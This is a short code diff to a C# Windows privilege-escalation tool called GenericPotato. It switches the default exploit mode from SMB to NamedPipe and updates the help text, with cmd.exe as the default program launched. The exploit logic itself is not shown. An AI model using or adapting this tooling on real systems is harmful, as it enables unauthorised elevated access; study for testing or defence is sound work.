@@ -20,7 +20,7 @@ namespace GenericPotato {
             string program = @"c:\Windows\System32\cmd.exe";
             string programArgs = null;
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
-            PotatoAPI.Mode mode = PotatoAPI.Mode.SMB;
+            PotatoAPI.Mode mode = PotatoAPI.Mode.NamedPipe;
             bool showHelp = false;
 
             Console.WriteLine(
@@ -32,7 +32,7 @@ namespace GenericPotato {
                 .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                 .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                 .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
-                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [HTTP|SMB(default)] ", v => mode = v)
+                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [HTTP|NamedPipe(default)] ", v => mode = v)
                 .Add<ushort>("l=|port=", "HTTP port to listen on (default 8888)", v => port = v)
                 .Add("i=|host=", "HTTP host to listen on (default 127.0.0.1)", v => host = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
